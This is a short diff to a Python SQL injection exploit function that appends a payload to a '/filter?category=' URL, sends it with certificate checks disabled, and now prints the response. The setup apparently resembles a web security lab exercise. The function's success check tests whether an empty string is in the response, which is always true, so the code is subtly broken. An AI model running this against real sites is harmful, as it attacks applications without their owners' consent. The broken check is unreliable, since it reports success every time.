@@ -11,6 +11,7 @@ def exploit_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False)
     if "" in r.text:
+        print(r.text)
         return True
     else:
         return False
